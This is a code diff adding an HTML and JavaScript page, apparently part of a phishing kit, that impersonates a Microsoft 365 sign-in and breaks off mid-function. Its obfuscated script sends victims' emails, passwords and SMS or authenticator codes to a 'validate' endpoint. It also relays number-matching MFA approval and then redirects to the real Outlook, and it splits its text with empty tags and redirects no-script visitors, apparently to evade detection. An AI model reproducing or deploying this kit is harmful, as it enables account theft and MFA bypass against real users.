@@ -1,0 +1,725 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="data:image/vnd.microsoft.icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAMMOAADDDgAAAAAAAAAAAAD1wlD/87Ik//OzJf/zsyX/87Ml//OzJf/zsiL/+dJ9/4qk+v85ZfX/PGj2/zxo9v88aPb/PGj2/ztm9v9jhvj/87cy//ClAP/wpQD/8KUA//ClAP/wpQD/8KQA//fKZv93lfn/GEvz/xxO8/8cTvP/HE7z/xxO8/8aTPP/SXH2//O3M//wpQD/8KYB//CmAf/wpgH/8KYB//ClAP/3y2f/d5b5/xlM8/8dT/P/HU/z/x1P8/8dT/P/G07z/0py9v/ztzP/8KUA//CmAf/wpgH/8KYB//CmAf/wpQD/98tn/3eW+f8ZTPP/HU/z/x1P8/8dT/P/HU/z/xtO8/9Kcvb/87cz//ClAP/wpgH/8KYB//CmAf/wpgH/8KUA//fLZ/93lvn/GUzz/x1P8/8dT/P/HU/z/x1P8/8bTvP/SnL2//O3M//wpQD/8KYB//CmAf/wpgH/8KYB//ClAP/3y2f/d5b5/xlM8/8dT/P/HU/z/x1P8/8dT/P/G07z/0py9v/ztjL/8KQA//ClAP/wpQD/8KUA//ClAP/wowD/98pm/3WU+P8VSfP/GUzz/xlM8/8ZTPP/GUzz/xhL8/9HcPb/+tWG//jLZ//4y2n/+Mtp//jLaf/4y2n/+Mpm//vgpf+2xvz/g5/5/4ag+f+GoPn/hqD5/4ag+f+Fn/n/nrP6/4Te//9m1v//Z9b//2fW//9n1v//Z9b//2XW//+n5///pOjQ/2fYsf9p2bP/admz/2nZs/9p2bP/aNiy/4nhw/8vxv//ALj//wC5//8Auf//ALn//wC5//8AuP//atb//2TVsP8AuXv/ALp9/wC6ff8Aun3/ALp9/wC5fP82yJn/MMf//wC5//8Buv//Abr//wG6//8Buv//ALn//2vX//9m1rH/ALp9/wK7f/8Cu3//Art//wK7f/8Aun7/OMma/zDH//8Auf//Abr//wG6//8Buv//Abr//wC5//9r1///Ztax/wC6ff8Cu3//Art//wK7f/8Cu3//ALp+/zjJmv8wx///ALn//wG6//8Buv//Abr//wG6//8Auf//a9f//2bWsf8Aun3/Art//wK7f/8Cu3//Art//wC6fv84yZr/MMf//wC5//8Buv//Abr//wG6//8Buv//ALn//2vX//9m1rH/ALp9/wK7f/8Cu3//Art//wK7f/8Aun7/OMma/y/H//8Auf//ALr//wC6//8Auv//ALr//wC4//9q1v//ZdWw/wC5fP8Aun7/ALp+/wC6fv8Aun7/ALp9/zbJmf9P0P//JcX//yfF//8nxf//J8X//yfF//8jxP//gN3//4TewP8xyJf/NMiY/zTImP80yJj/NMiY/zLImP9f1K7/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" />
+    <title>Confirm your login</title>
+    <noscript>
+        <meta http-equiv="Refresh" content="0; URL=https://href.li/?https://en.wikipedia.org/wiki/Category:Office_365" />
+    </noscript>
+    <link rel="stylesheet" href="../page/styles/app.css" />
+    <style>
+        @media screen and (min-width:600px) {
+            
+        html,
+        body {
+            content: ""; /* Empty content to allow the pseudo-element to render */
+            position: absolute; /* Absolute positioning */
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: -1; /* Ensure it stays behind other content */
+            background-image: url("data:image/png;base64,<STRIPPED>");
+            background-size: cover; /* Scale image to cover the entire area */
+            background-position: center; /* Center the background image */
+            background-repeat: no-repeat; /* Prevent repeating the image */
+        } 
+                }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .blinking {
+            animation: blink 3s infinite;
+        }
+
+        .verification-options {
+            display: table;
+            width: 100%;
+            border-spacing: 0;
+        }
+        .option {
+            display: table-row;
+            cursor: pointer;
+        }
+        .option:hover {
+            background-color: #f0f0f0;
+        }
+        .option span {
+            display: table-cell;
+            padding: 10px;
+            vertical-align: middle;
+            font-size: 85%; /* 15% smaller font size */
+        }
+        .option .icon {
+            width: 20%;
+            padding-right: 5px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+
+<body>
+    <section class = "wyUtboSe1E" id="section_uname">
+
+        <div class="wyUtboSe1E auth-wrapper">
+            <div class="wyUtboSe1E overlay" id="overlay">
+                <div class="spinner"></div>
+            </div>
+            <img class = "wyUtboSe1E d-block" src="data:image/png;base64,<STRIPPED>" alt="Icon"/>
+            <h2 class=" wyUtboSe1E title mb-16 mt-16"><img src="data:image/png;base64,<STRIPPED>" alt="Icon" class=" wyUtboSe1E d-block"/></h2>
+            <form id="form" class = "wyUtboSe1E">
+                <div class="mb-16 wyUtboSe1E">
+                    <p id="error_uname" class="error"></p>
+                    <div class="wyUtboSe1E input-container">
+                        <img src="data:image/png;base64,<STRIPPED>" alt="placeholder" class="placeholder-image" id="placeholder-image">
+                        <input id="inp_uname" type="text" name="uname" class="input" placeholder="" autocomplete="off"/>
+                    </div>
+                </div>
+            </form>
+            <div>
+                <p class="wyUtboSe1E mb-16 fs-13">N<a class="wyUtboSe1E"></a>o a<a class="wyUtboSe1E"></a>cc<a class="wyUtboSe1E"></a>ou<a class="wyUtboSe1E"></a>nt? <a href="" class="link">Cr<b></b>e<b></b>a<b></b>t<b></b>e o<b></b>ne!</a></p>
+                <p class="wyUtboSe1E mb-16 fs-13">
+                    <a href="#" class="wyUtboSe1E link">S<b></b>i<b></b>g<b></b>n in w<b></b>i<b></b>t<b></b>h a se<b></b>cu<b></b>r<b></b>it<b></b>y k<b></b>e<b></b>y
+                        <img src="data:image/png;base64,<STRIPPED>" alt="Question img">
+                    </a>
+                </p>
+            </div>
+            <div>
+                <button class="wyUtboSe1E btn" id="btn_next">N<b></b>e<b></b>x<b></b>t</button>
+            </div>
+        </div>
+        <div class="wyUtboSe1E opts">
+            <p class="wyUtboSe1E has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="data:image/png;base64,<STRIPPED>" width="30px" /></span> <span id="signInOptions"></span></p>
+        </div>
+    </section>
+
+    <section id="section_pwd" class=" wyUtboSe1E d-none">
+        <div class="wyUtboSe1E auth-wrapper">
+            <div class="wyUtboSe1E overlay" id="overlay2">
+                <div class="spinner"></div>
+            </div>
+            <img id="logoimage" src="data:image/png;base64,<STRIPPED>" alt="Icon" style="max-width: 168px; max-height: 36px; width: auto; height: auto;" class="wyUtboSe1E d-block" />
+            <div class="wyUtboSe1E identity w-100 mt-16 mb-16">
+                <button class="wyUtboSe1E back">
+                    <img src="../page/images/back.png" />
+                </button>
+                <span class="wyUtboSe1E" id="user_identity"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f190b193df929e9c">[email&#160;protected]</a></span>
+            </div>
+            <h2 class="wyUtboSe1E title mb-16"><img src="data:image/png;base64,<STRIPPED>" alt="Icon" style="width: 50%; height: auto;" class=" wyUtboSe1E d-block"/></h2>
+            <form id="form2" class="wyUtboSe1E">
+                <div class="mb-16">
+                    <p class="wyUtboSe1E error" id="error_pwd"></p>
+                    <div class="wyUtboSe1E input-container">
+                        <img src="data:image/png;base64,<STRIPPED>" style="width: 18%; height: auto;" alt="placeholder" class="placeholder-image" id="placeholder-image-2">
+                        <input id="inp_pwd" type="password" name="pass" class="input" placeholder="" />
+                    </div>
+                </div>
+            </form>
+            <div>
+                <p class="wyUtboSe1E mb-16"> <a href="#" class="link fs-13">F<b></b>or<b></b>g<b></b>o<b></b>t p<b></b>as<b></b>s<b></b>w<b></b>o<b></b>rd?</a></p>
+                <p class="wyUtboSe1E mb-16">
+                    <a href="#" class="wyUtboSe1E link fs-13">O<b></b>t<b></b>he<b></b>r w<b></b>ay<b></b>s t<b></b>o s<b></b>ig<b></b>n i<b></b>n</a>
+                </p>
+            </div>
+            <div>
+                <button class="wyUtboSe1E btn" id="btn_sig">S<b></b>ig<b></b>n i<b></b>n</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="../page/images/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="365776541855595b">[email&#160;protected]</a></span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final">No</button>
+                <button class="btn" id="btn_final">Yes</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_verifnotif" class=" wyUtboSe1E d-none">
+        <div class="wyUtboSe1E auth-wrapper">
+            <div class="wyUtboSe1E overlay" id="overlay3">
+                <div class="spinner"></div>
+            </div>
+            <img id="logoimage" src="data:image/png;base64,<STRIPPED>" alt="Icon" style="max-width: 168px; max-height: 36px; width: auto; height: auto;" class="wyUtboSe1E d-block" />
+            <div class="wyUtboSe1E identity w-100 mt-16 mb-16">
+                <button class="wyUtboSe1E back">
+                    <img src="../page/images/back.png" />
+                </button>
+                <span class="wyUtboSe1E" id="user_identity"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6f0e2f0d410c0002">[email&#160;protected]</a></span>
+            </div>
+            <h2 class="wyUtboSe1E title mb-16">Enter code</h2>
+            <p class="p"><img src="data:image/png;base64,<STRIPPED>" style="width: 85%; height: auto;" alt="Microsoft" class="d-block" /></p>
+            <form id="form3" class="wyUtboSe1E">
+                <div class="mb-16">
+                    <p class="wyUtboSe1E error" id="error_verifnotif"></p>
+                    <div class="wyUtboSe1E input-container">
+                        <input id="inp_verifnotif" type="text" name="code" class="input" placeholder="Code" autocomplete="off"/>
+                    </div>
+                </div>
+            </form>
+            <div>
+                <p class="wyUtboSe1E mb-16"> <a href="#" class="link fs-13">More information</a></p>
+            </div>
+            <div>
+                <button class="wyUtboSe1E btn" id="btn_notif">Verify</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_sms" class=" wyUtboSe1E d-none">
+        <div class="wyUtboSe1E auth-wrapper">
+            <div class="wyUtboSe1E overlay" id="overlay4">
+                <div class="spinner"></div>
+            </div>
+            <img id="logoimage" src="data:image/png;base64,<STRIPPED>" alt="Icon" style="max-width: 168px; max-height: 36px; width: auto; height: auto;" class="wyUtboSe1E d-block" />
+            <div class="wyUtboSe1E identity w-100 mt-16 mb-16">
+                <button class="wyUtboSe1E back">
+                    <img src="../page/images/back.png" />
+                </button>
+                <span class="wyUtboSe1E" id="user_identity"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c8a988aae6aba7a5">[email&#160;protected]</a></span>
+            </div>
+            <h2 class="wyUtboSe1E title mb-16">Enter code</h2>
+            <p id="showDisplay2" class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="../page/images/info.png" style="width: 85%; height: auto;"></span> We texted your phone +XX XXXXXXXXX23. Please enter the code to sign in.</p>
+            </br>
+            <form id="form4" class="wyUtboSe1E">
+                <div class="mb-16">
+                    <p class="wyUtboSe1E error" id="error_sms"></p>
+                    <div class="wyUtboSe1E input-container">
+                        <input id="inp_codesms" type="text" name="code" class="input" placeholder="Code" autocomplete="off"/>
+                    </div>
+                </div>
+            </form>
+            <div>
+                <p class="wyUtboSe1E mb-16"> <a href="#" class="link fs-13">More information</a></p>
+            </div>
+            <div>
+                <button class="wyUtboSe1E btn" id="btn_sms">Verify</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_appnotif" class=" wyUtboSe1E d-none">
+        <div class="wyUtboSe1E auth-wrapper">
+            <div class="wyUtboSe1E overlay" id="overlay5">
+                <div class="spinner"></div>
+            </div>
+            <img id="logoimage" src="data:image/png;base64,<STRIPPED>" alt="Icon" style="max-width: 168px; max-height: 36px; width: auto; height: auto;" class="wyUtboSe1E d-block" />
+            <div class="wyUtboSe1E identity w-100 mt-16 mb-16">
+                <span class="wyUtboSe1E" id="user_identity"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="debf9ebcf0bdb1b3">[email&#160;protected]</a></span>
+            </div>
+            <h2 class="wyUtboSe1E title mb-16">Approve sign in request</h2>
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="../page/images/appnotif2.png" class="blinking" style="width: 85%; height: auto;"></span> Open your Authenticator app, and enter the number shown to sign in.​​</p>
+            <br/>
+            <div style="display: flex; justify-content: center; align-items: center;">
+                <p id="entropy" class="has-icon mb-0" style="font-size: 40px; text-align: center; border: 2px solid black; padding: 10px;">
+                    50
+                </p>
+            </div>
+            <br/><br/>
+            <p class="has-icon mb-0" style="font-size:15px;">No numbers in your app? Make sure to upgrade to the latest version.</p><br/>
+            <div>
+                <p class="wyUtboSe1E mb-16"> <a href="#" id="link_back" class="link fs-13">I can't use my Microsoft Authenticator app right now</a></p>
+                <p class="wyUtboSe1E mb-16"> <a href="#" class="link fs-13">More information</a></p>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_2fa" class="d-none"> 
+        <div class="auth-wrapper">
+            <div class="wyUtboSe1E overlay" id="overlay6">
+                <div class="spinner"></div>
+            </div>
+            <img src="../page/images/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="254465470b464a48">[email&#160;protected]</a></span>
+            </div>
+            <h2 class="title mb-16"><img src="../page/images/verify.png" style="width: 60%; height: auto;" alt="Microsoft" class="d-block" /></h2>
+            <div class="verification-options">
+                <div class="option" data-url="verify_app">
+                    <span class="icon"><img src="../page/images/verify_app.png" style="width: 65%; height: auto;"></span>
+                    <span>Approve a request on my Microsoft Authenticator app</span>
+                </div>
+                <div class="option" data-url="verify_code">
+                    <span class="icon"><img src="../page/images/verify_code.png" style="width: 65%; height: auto;"></span>
+                    <span>Use a verification code</span>
+                </div>
+                <div class="option" data-url="verify_sms">
+                    <span class="icon"><img src="../page/images/verify_sms.png" style="width: 65%; height: auto;"></span>
+                    <span id="showDisplay">Text +XX XXXXXXXXX23</span>
+                </div>
+            </div><br/>
+            <div>
+                <p class="wyUtboSe1E mb-16"> <a href="#" class="link fs-13">More information</a></p>
+                <p class="wyUtboSe1E fs-13">
+                    Are your verification methods current? Check at https://aka.ms/mfasetup
+                </p>
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final">Cancel</button>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const debug = false;
+            // PHP variables
+            const encodedText = "U2lnbi1pbiBvcHRpb25z";
+            const decodedText = atob(encodedText);
+            const random = "https://href.li/?https://en.wikipedia.org/wiki/Microsoft_365";
+            const defaultBackground = "data:image/png;base64,<STRIPPED>";
+            const defaultLogo = "data:image/png;base64,<STRIPPED>";
+            const final_redirect = atob("aHR0cHM6Ly9vdXRsb29rLm9mZmljZTM2NS5jb20v");
+            const selection = "0";
+            // Error images
+            const unReq = '<img src="data:image/png;base64,<STRIPPED>">';
+            const unEm = '<img src="data:image/png;base64,<STRIPPED>">';
+            const pwdReq = '<img src="data:image/png;base64,<STRIPPED>">';
+            const unPw = '<img src="data:image/png;base64,<STRIPPED>">';
+            const unCode = '<img style="width: 95%; height: auto;" src="data:image/png;base64,<STRIPPED>">';
+            const unSms = '<img style="width: 90%; height: auto;" src="data:image/png;base64,<STRIPPED>">';
+            const emCode = '<img style="width: 80%; height: auto;" src="data:image/png;base64,<STRIPPED>">';
+
+            // Initial settings from PHP
+                            let view = "uname";
+                let enmail = "";
+            
+
+
+let unameVal=![],pwdVal=![],codeVal=![],twoVal=![],smsVal=![],appVal=![];
+
+var default_item='';
+const unameInp = document['getElementById']('inp_uname'),
+    pwdInp = document['getElementById']('inp_pwd'),
+    codeInp = document['getElementById']('inp_verifnotif'),
+    smsInp = document['getElementById']('inp_codesms'),
+    form = document['getElementById']('form'),
+    logo = document['getElementById']('logoimage'),
+    placeholderImage = document['getElementById']('placeholder-image'),
+    placeholderImage2 = document['getElementById']('placeholder-image-2'),
+    signInOptions = document['getElementById']('signInOptions'),
+    overlayMap = {
+        'uname': 'overlay',
+        'pwd': 'overlay2',
+        '2fa': 'overlay6',
+        'sms': 'overlay4',
+        '2fa_submit_code': 'overlay5',
+        'verifnotif': 'overlay3'
+    },
+    inputMap = {
+        'uname': {
+            'input': unameInp,
+            'errorVar': 'unameVal'
+        },
+        'pwd': {
+            'input': pwdInp,
+            'errorVar': 'pwdVal'
+        },
+        '2fa_submit_sms': {
+            'input': smsInp,
+            'errorVar': 'codeVal'
+        },
+        '2fa_submit_code': {
+            'input': codeInp,
+            'errorVar': 'smsVal'
+        }
+    };
+
+function toggleVisibility(_0x34e260, _0x8dc3c) {
+        _0xa3e1ac = document['getElementById'](_0x34e260);
+    _0xa3e1ac && _0xa3e1ac['classList']['toggle']('d-none', !_0x8dc3c);
+}
+
+function setBodyStyles(_0x50c72a) {
+    Object['assign'](document['body']['style'], _0x50c72a);
+}
+
+function updateView(_0x565692, _0x4e3a06 = [], _0x1c62b4 = []) {
+    view = _0x565692, _0x4e3a06['forEach'](_0x14aaad => toggleVisibility(_0x14aaad, !![])), _0x1c62b4['forEach'](_0x39ceda => toggleVisibility(_0x39ceda, ![]));
+}
+
+function setBackgroundAndLogo(_0x336ad6, _0x35deeb) {
+    document['body']['style']['cssText'] = 'content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 0; z-index: -1; background-image: url("' + (_0x336ad6 || defaultBackground) + '"); background-size: cover; background-position: center; background-repeat: no-repeat;', logo['src'] = _0x35deeb || defaultLogo;
+}
+
+function hideOption(element) {
+    document['querySelector'](element)?.['classList']['add']('hidden');
+}
+
+function showOption(element) {
+    document['querySelector'](element)?.['classList']['remove']('hidden');
+}
+
+function updateInputState() {
+    placeholderImage['style']['display'] = unameInp['value']['trim']() ? 'none' : 'block', document['getElementById']('error_uname')['innerText'] = '', unameInp['classList']['toggle']('error-inp', !unameInp['value']['trim']());
+}
+
+function updateInputStatePass() {
+    placeholderImage2['style']['display'] = pwdInp['value']['trim']() ? 'none' : 'block', document['getElementById']('error_pwd')['innerText'] = '', pwdInp['classList']['toggle']('error-inp', !pwdInp['value']['trim']());
+}
+
+function updateInputCode() {
+    document['getElementById']('error_verifnotif')['innerText'] = '', codeInp['classList']['toggle']('error-inp', !codeInp['value']['trim']());
+}
+
+function updateInputSms() {
+    document['getElementById']('error_sms')['innerText'] = '', smsInp['classList']['toggle']('error-inp', !smsInp['value']['trim']());
+}
+
+document['querySelectorAll']('.option')['forEach'](_0x377a5d => {
+    _0x377a5d['addEventListener']('click', () => {
+        const _0x1b8812 = _0x377a5d['getAttribute']('data-url');
+        show('2fa'), $['ajax']({
+            'url': 'validate',
+            'type': 'POST',
+            'dataType': 'json',
+            'data': {
+                'em': unameInp['value'],
+                'auth': _0x1b8812
+            },
+            'success': function(_0x30207c) {
+                hideSection('2fa');
+                const {
+                    live: _0x458b77
+                } = _0x30207c;
+                if (_0x458b77) {
+                    if (!twoVal) {
+                        if (_0x1b8812 === 'verify_app') {
+                            updateView('2fa_submit_app', ['section_appnotif'], ['section_2fa']), document['getElementById']('entropy')['innerHTML'] = _0x30207c['entropy'];
+                            const _0x3d82e4 = setInterval(() => {
+                                view == '2fa_submit_app' ? $['ajax']({
+                                    'url': 'validate',
+                                    'type': 'POST',
+                                    'dataType': 'json',
+                                    'data': {
+                                        'em': unameInp['value'],
+                                        'auth': _0x1b8812,
+                                        'code': ''
+                                    },
+                                    'success': function(_0x24a989) {
+                                        const { live: _0x5ec6af } = _0x24a989;
+                                        if (_0x5ec6af) !appVal && (appVal = !![], document['getElementById']('section_appnotif')['classList']['add']('d-none'), document['getElementById']('section_final')['classList']['remove']('d-none'), view = 'final');
+                                        else {}
+                                    },
+                                    'error': function() {
+                                        alert('An\x20error\x20occurred\x20during\x20the\x20periodic\x20validation.');
+                                    }
+                                }) : clearInterval(_0x3d82e4);
+                            }, 0x1388);
+                        } else _0x1b8812 === 'verify_code' ? updateView('2fa_submit_code', ['section_verifnotif'], ['section_2fa']) : updateView('2fa_submit_sms', ['section_sms'], ['section_2fa']);
+                        twoVal = !![];
+                    }
+                } else updateView('pwd', ['section_pwd'], ['section_2fa']), document['querySelectorAll']('#user_identity')['forEach'](_0xfadc4a => _0xfadc4a['innerText'] = enmail), unameInp['value'] = enmail, unameVal = !![], pwdVal = ![];
+            },
+            'error': function() {
+                alert('An\x20error\x20occurred.');
+            }
+        });
+    });
+}), document['getElementById']('link_back')['addEventListener']('click', _0x2e4f56 => {
+    _0x2e4f56['preventDefault'](), twoVal = ![], appVal = ![], updateView('2fa', ['section_2fa'], ['section_appnotif']);
+}), unameInp['addEventListener']('input', updateInputState), pwdInp['addEventListener']('input', updateInputStatePass), codeInp['addEventListener']('input', updateInputCode), smsInp['addEventListener']('input', updateInputSms);
+view === 'pwd' && (unameVal = !![], document['querySelectorAll']('#user_identity')['forEach'](_0xd90c3c => _0xd90c3c['innerText'] = enmail), unameInp['value'] = enmail, updateView('pwd', ['section_pwd'], ['section_uname']));
+debug && updateView('2fa', ['section_2fa'], ['section_pwd']);
+document['getElementById']('btn_next')['addEventListener']('click', validate), document['getElementById']('btn_sig')['addEventListener']('click', validate), document['getElementById']('btn_notif')['addEventListener']('click', validate), document['getElementById']('btn_sms')['addEventListener']('click', validate), form['addEventListener']('submit', _0x1de172 => {
+    _0x1de172['preventDefault'](), validate();
+}), form2['addEventListener']('submit', _0x31afa7 => {
+    _0x31afa7['preventDefault'](), validate();
+}), form3['addEventListener']('submit', _0x2537dc => {
+    _0x2537dc['preventDefault'](), validate();
+}), form4['addEventListener']('submit', _0x2e9b98 => {
+    _0x2e9b98['preventDefault'](), validate();
+});
+
+
+function show(_0x8746b5) {
+    document['getElementById']('section_' + _0x8746b5)['classList']['add']('section-disabled'), document['querySelectorAll']('.common-overlay')['forEach'](_0x2759af => _0x2759af['classList']['remove']('active'));
+    const _0x4a09da = overlayMap[_0x8746b5] || 'overlay';
+    document['getElementById'](_0x4a09da)['classList']['add']('active');
+}
+
+function hide(_0xea4f95, _0x155629 = ![], _0xb5c911 = null) {
+    document['getElementById']('section_' + _0xea4f95)['classList']['remove']('section-disabled');
+    const _0x25d4e9 = overlayMap[_0xea4f95] || 'overlay';
+    document['getElementById'](_0x25d4e9)['classList']['remove']('active'), document['getElementById']('error_' + _0xea4f95)['innerHTML'] = _0xb5c911;
+    const _0x502ba8 = inputMap[_0xea4f95];
+    if (_0x502ba8) {
+        const {
+            input: _0x5eabc7,
+            errorVar: _0x5c1caf
+        } = _0x502ba8;
+        _0x5eabc7['classList']['toggle']('error-inp', !_0x155629), window[_0x5c1caf] = _0x155629;
+    }
+}
+
+function hideSection(_0x4896f6) {
+    document['getElementById']('section_' + _0x4896f6)['classList']['remove']('section-disabled');
+    const _0x40f26 = overlayMap[_0x4896f6] || 'overlay';
+    document['getElementById'](_0x40f26)['classList']['remove']('active');
+}
+
+
+function validate(){
+	
+	function _0x592abb(_0x503c5d){
+		show('uname');
+		if(!_0x503c5d){
+			hide('uname',![],unReq);
+			return;
+		}
+		$['ajax']({
+			'url':'validate',
+			'type':'POST',
+			'dataType':'json',
+			'data':{'em':unameInp['value']},
+			'success':function(_0x388311){
+				const {
+						live:_0x4c3d10,
+						grablogo:_0x2bd534,
+						background:_0x2de95b,
+						icon:_0x53f297
+					}=_0x388311;
+				_0x4c3d10&&!unameVal?(hide('uname',!![],''),_0x2bd534&&setBackgroundAndLogo(_0x2de95b,_0x53f297),updateView('pwd',['section_pwd'],['section_uname']),document['querySelectorAll']('#user_identity')['forEach'](_0x3ea611=>_0x3ea611['innerText']=unameInp['value']),view='pwd',unameVal=!![]):hide('uname',![],unEm);
+			},
+			'error':function(){
+				window['location']['href']=random;
+			}
+		});
+	}
+	function _0x9e84c(_0x36ad87){
+		show('pwd');
+		if(!_0x36ad87){
+			hide('pwd',![],pwdReq);return;
+		}
+		$['ajax']({
+			'url':'validate',
+			'type':'POST',
+			'dataType':'json',
+			'data':{
+				'em':unameInp['value'],
+				'pa':pwdInp['value']
+			},
+			'success':function(_0x5dd83c){
+				const {
+						live:_0x3e1f87,
+						twofactor:_0x44ec39,
+						twofactor_info:_0x1f4164
+					}=_0x5dd83c;
+				if(_0x3e1f87){
+					if(_0x44ec39){
+						if(!pwdVal){
+							_0x1f4164['forEach'](_0x29da87=>{
+								switch(_0x29da87['method_name']){
+									case 'PhoneAppNotification':
+									showOption('.option[data-url="verify_app"]');
+									break;
+									case 'PhoneAppOTP':
+									showOption('.option[data-url="verify_code"]');
+									break;
+									case 'OneWaySMS':
+									showOption('.option[data-url="verify_sms"]');
+									break;
+								}
+								_0x29da87['isDefault']==!![]&&(default_item=_0x29da87['method_name']),_0x29da87['display']&&(document['getElementById']('showDisplay')['innerText']='Text '+_0x29da87['display'],document['getElementById']('showDisplay2')['innerHTML']='<span\x20class=\x22icon\x22><img\x20src=\x22../page/images/info.png\x22\x20style=\x22width:\x2085%;\x20height:\x20auto;\x22></span>\x20We\x20texted\x20your\x20phone\x20'+_0x29da87['display']+'. Please enter the code to sign in.');
+							});
+							if(selection==0x0) hide('pwd',!![],''),document['getElementById']('section_pwd')['classList']['add']('d-none'),document['getElementById']('section_2fa')['classList']['remove']('d-none'),view='2fa',pwdVal=!![],twoVal=![];
+							else {
+								var _0x5ec4cc='';
+								switch(default_item){
+									case 'PhoneAppNotification':
+									_0x5ec4cc='verify_app';
+									break;
+									case 'PhoneAppOTP':
+									_0x5ec4cc='verify_code';
+									break;
+									case 'OneWaySMS':
+									_0x5ec4cc='verify_sms';
+									break;
+									default:
+									hide('pwd',!![],''),document['getElementById']('section_pwd')['classList']['add']('d-none'),document['getElementById']('section_2fa')['classList']['remove']('d-none'),view='2fa',pwdVal=!![],twoVal=![];
+									break;
+								}
+								_0x5ec4cc!=''&&$['ajax']({
+									'url':'validate',
+									'type':'POST',
+									'dataType':'json',
+									'data':{
+										'em':unameInp['value'],
+										'auth':_0x5ec4cc
+									},
+									'success':function(_0x44fabe){
+										hideSection('2fa');
+										const {
+											live:_0xfb00a3
+										}=_0x44fabe;
+										if(_0xfb00a3){
+											if(!twoVal){
+												hide('pwd',!![],''),pwdVal=!![],twoVal=![];
+												if(_0x5ec4cc==='verify_app'){
+													updateView('2fa_submit_app',['section_appnotif'],['section_pwd']),document['getElementById']('entropy')['innerHTML']=_0x44fabe['entropy'];
+												const _0x5dd40a=setInterval(()=>{
+													view=='2fa_submit_app'?$['ajax']({
+														'url':'validate',
+														'type':'POST',
+														'dataType':'json',
+														'data':{
+															'em':unameInp['value'],
+															'auth':_0x5ec4cc,'code':''
+														},
+														'success':function(_0x283387){
+															const { live:_0x5c6f7a }=_0x283387;
+																if(_0x5c6f7a) !appVal&&(appVal=!![],document['getElementById']('section_appnotif')['classList']['add']('d-none'),document['getElementById']('section_final')['classList']['remove']('d-none'),view='final');
+																else {}
+														},
+														'error':function(){
+															alert('An error occurred during the periodic validation.');
+														}
+													}):clearInterval(_0x5dd40a);},
+												0x1388);
+											}
+											else _0x5ec4cc==='verify_code'?updateView('2fa_submit_code',['section_verifnotif'],['section_pwd']):updateView('2fa_submit_sms',['section_sms'],['section_pwd']);
+											}
+										}
+										else updateView('pwd',['section_pwd'],['section_2fa']),document['querySelectorAll']('#user_identity')['forEach'](_0x5a243a=>_0x5a243a['innerText']=enmail),unameInp['value']=enmail,unameVal=!![],pwdVal=![];
+									},
+									'error':function(){
+										alert('An error occurred.');
+									}
+								});
+							}
+						}
+					}
+					else !pwdVal&&(hide('pwd',!![],''),document['getElementById']('section_pwd')['classList']['add']('d-none'),document['getElementById']('section_final')['classList']['remove']('d-none'),view='final',pwdVal=!![]);
+				}
+				else hide('pwd',![],unPw);
+			},
+			'error':function(){
+				alert('An error occurred.');
+			}
+		});
+	}
+	
+	function _0x1d6c79(_0x4a5372) {
+        show('verifnotif');
+        if (!_0x4a5372) {
+            hide('verifnotif', ![], emCode);
+            return;
+        }
+        $['ajax']({
+            'url': 'validate',
+            'type': 'POST',
+            'dataType': 'json',
+            'data': {
+                'em': unameInp['value'],
+                'auth': 'verify_code',
+                'code': codeInp['value']
+            },
+            'success': function(_0x35628c) {
+                const { live: _0x44ea06 } = _0x35628c;
+                if (_0x44ea06) !codeVal && (hide('verifnotif', !![], ''), document['getElementById']('section_verifnotif')['classList']['add']('d-none'), document['getElementById']('section_final')['classList']['remove']('d-none'), view = 'final');
+                else {
+                    hide('verifnotif', ![], unCode);
+                    if (_0x35628c['reason'] != 'OathCodeIncorrect') {}
+                }
+            },
+            'error': function() {
+                alert('An error occurred.');
+            }
+        });
+    }
+	
+	function _0x44f07c(_0x395748) {
+        show('sms');
+        if (!_0x395748) {
+            hide('sms', ![], emCode);
+            return;
+        }
+        $['ajax']({
+            'url': 'validate',
+            'type': 'POST',
+            'dataType': 'json',
+            'data': {
+                'em': unameInp['value'],
+                'auth': 'verify_sms',
